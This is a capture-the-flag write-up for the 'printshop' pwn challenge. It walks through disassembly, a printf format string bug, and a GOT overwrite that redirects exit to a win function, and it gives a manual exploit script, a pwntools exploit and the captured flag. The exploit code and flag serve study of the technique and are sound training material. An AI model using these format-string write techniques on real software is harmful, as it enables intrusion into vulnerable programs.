---
title: printshop
date: 2023-09-09 18:35:00 + 0530
categories: [writeup, pwn]
tags: [patriot]     # TAG names should always be lowercase
---

## The Challenge

> That print shop down the road is useless, can you make it do something interesting?
>
> Attachment : printshop

## The Solution

The name "print" shop suggests that it might have something do to with the printf function. Maybe a format string vulnerability?

### Finding the vulnerability

When we download the binary and run it locally:

```console
$ ./printshop

Welcome to the Print Shop!

What would you like to print? >> gimme the flag

Thank you for your buisness!

gimme the flag
```

we see that its just printing whatever we give as input.

If we load the binary in gdb and disassemble the main method we get the following:

```
gdb-peda$ disassemble main 
Dump of assembler code for function main:
   0x0000000000401344 <+0>:    endbr64
   0x0000000000401348 <+4>:    push   rbp
   0x0000000000401349 <+5>:    mov    rbp,rsp
   0x000000000040134c <+8>:    sub    rsp,0x70
   0x0000000000401350 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000401359 <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040135d <+25>:    xor    eax,eax
   0x000000000040135f <+27>:    lea    rax,[rip+0xcd9]        # 0x40203f
   0x0000000000401366 <+34>:    mov    rdi,rax
   0x0000000000401369 <+37>:    call   0x4010e0 <puts@plt>
   0x000000000040136e <+42>:    lea    rax,[rip+0xceb]        # 0x402060
   0x0000000000401375 <+49>:    mov    rdi,rax
   0x0000000000401378 <+52>:    mov    eax,0x0
   0x000000000040137d <+57>:    call   0x401110 <printf@plt>
   0x0000000000401382 <+62>:    mov    rdx,QWORD PTR [rip+0x2d07]        # 0x404090 <stdin@GLIBC_2.2.5>
   0x0000000000401389 <+69>:    lea    rax,[rbp-0x70]
   0x000000000040138d <+73>:    mov    esi,0x64
   0x0000000000401392 <+78>:    mov    rdi,rax
   0x0000000000401395 <+81>:    call   0x401130 <fgets@plt>
   0x000000000040139a <+86>:    lea    rax,[rip+0xce7]        # 0x402088
   0x00000000004013a1 <+93>:    mov    rdi,rax
   0x00000000004013a4 <+96>:    call   0x4010e0 <puts@plt>
   0x00000000004013a9 <+101>:    lea    rax,[rbp-0x70]
   0x00000000004013ad <+105>:    mov    rdi,rax
   0x00000000004013b0 <+108>:    mov    eax,0x0
   0x00000000004013b5 <+113>:    call   0x401110 <printf@plt>
   0x00000000004013ba <+118>:    mov    edi,0x0
   0x00000000004013bf <+123>:    call   0x401160 <exit@plt>
End of assembler dump.
gdb-peda$
```

There are a few interesting things we can observe:

1. Usage of `fgets`:
   
   ```
      0x0000000000401382 <+62>:    mov    rdx,QWORD PTR [rip+0x2d07]        # 0x404090 <stdin@GLIBC_2.2.5>
      0x0000000000401389 <+69>:    lea    rax,[rbp-0x70]
      0x000000000040138d <+73>:    mov    esi,0x64
      0x0000000000401392 <+78>:    mov    rdi,rax
      0x0000000000401395 <+81>:    call   0x401130 <fgets@plt>
   ```
   
   We see that `fgets` is used to securely store 0x64 (100 in decimal) bytes from `stdin` to `rbp-0x70`. This rules out the possibility of a buffer overflow here.

2. `exit` instead of return:
   
   ```
   0x00000000004013bf <+123>:    call   0x401160 <exit@plt>
   End of assembler dump.
   ```
   
   Even if we had a buffer overflow, the main function is exiting instead of returning, which means that we can't control the instruction pointer in any case.

3. Unusual way of using `printf`:
   
   ```
      0x00000000004013a9 <+101>:    lea    rax,[rbp-0x70]
      0x00000000004013ad <+105>:    mov    rdi,rax
      0x00000000004013b0 <+108>:    mov    eax,0x0
      0x00000000004013b5 <+113>:    call   0x401110 <printf@plt>
   ```
   
   This translates to `printf(buffer);` instead of `printf("%s", buffer);` which is the well known format string vulnerability.
   
   In fact the man page of `printf` itself explicitly warns against using code like this:
   
   > Code such as printf(foo); often indicates a bug, since foo may contain a % character.  If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.

Just to be sure let's test it by adding a few format specifiers in our input:

```console
$ ./printshop

Welcome to the Print Shop!

What would you like to print? >> %x %x %x 

Thank you for your buisness!

8643b643 0 86300aa4
```

Yes it leaking values, which confirms that it is a simple case of format string vulnerability.

### How do we exploit it?

Since there is a call to `exit` after our vulnerable `printf` we can use this vulnerability to overwrite the GOT entry for exit with some other memory address.

But where exactly to jump to? Initially I was thinking about ROP chaining but that's a bit too much for an "EASY" challenge. Then I looked at a few other functions in the binary:

```console
$ nm printshop
000000000040038c r __abi_tag
0000000000404078 B __bss_start
00000000004040a8 b completed.0
...
00000000004040a0 B stderr@GLIBC_2.2.5
0000000000404090 B stdin@GLIBC_2.2.5
0000000000404080 B stdout@GLIBC_2.2.5
0000000000404078 D __TMC_END__
000000000040129d T win
```

`win()` seems interesting. We don't need to see its disassembly, its obvious from the name that this is the function we need to jump to.

### Writing the exploit

Let's throw a bunch of %p characters and see what values we are leaking:

```console
$ python -c 'print("%p " * 20)' | ./printshop

Welcome to the Print Shop!

What would you like to print? >> 
Thank you for your buisness!

0x7fd9c803b643 (nil) 0x7fd9c7f00aa4 0x1 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa20702520 (nil) (nil) (nil) 0x7fd9c826c730 (nil) 0xa4bd4f226a5b5000 0x1
```

We see an interesting pattern of repeating hex value: 0x70 0x25 0x20. They are nothing but 'p', '%', ' '.

Basically we start leaking our own input from the 6th argument. At this point we have 2 choice:

1. Manually craft the payload

2. Use pwntools

#### Manual way

During the challenge I used the manual way of exploiting it.

Here is the `exploit.py` script:

```python
import sys
import struct

EXIT_GOT = 0x404060
WIN = 0x40129d


payload  = b''
payload += '%{}p'.format(str(WIN)).encode()
payload += b'%17$n'
payload += b'-' * ( 99 - len(payload) - 8 - 3 )
payload += struct.pack("Q", EXIT_GOT)
payload += b'\n'

sys.stdout.buffer.write(payload)
```

Run it against their server and wait for a little over 4 million characters to be printed until we get our flag

> I know there are more efficient ways than printing 4 million characters, but what matters is it works.

```console
$ python exploit.py | nc chal.pctf.competitivecyber.club 7997
Welcome to the Print Shop!

What would you like to print? >> 
Thank you for your buisness!




...


                                                       0x7f3fed23b643--------------------------------------------------------------------------`@@PCTF{b4by_f0rm4t_wr1t3_6344792}
```

I'm not going to explain how I got to this solution because I myself would not recommend it. Instead use the pwntools method

> If you are still interested in this solution, checkout [this video](https://www.youtube.com/watch?v=_lO_rwaK_pY) 
{: .prompt-info}

#### pwntools

During the challenge I didn't know about this method, but I'm sharing it now because it is far better.

```python
from pwn import *

p = process('./printshop')
exe = ELF('./printshop')
context.binary = exe


p.sendline(fmtstr_payload(
    6,                          # Our input starts leaking from 6th argument
    {
        exe.got.exit :          # Where to write
        exe.symbols.win         # What to write
    }
))

print(p.clean())

p.close()
```

Run it *(and optionally filter for the flag)*:

```console
$ python exploit.py | grep -oE "PCTF{.*?}"
PCTF{b4by_f0rm4t_wr1t3_6344792}
```

## FLAG

`PCTF{b4by_f0rm4t_wr1t3_6344792}`

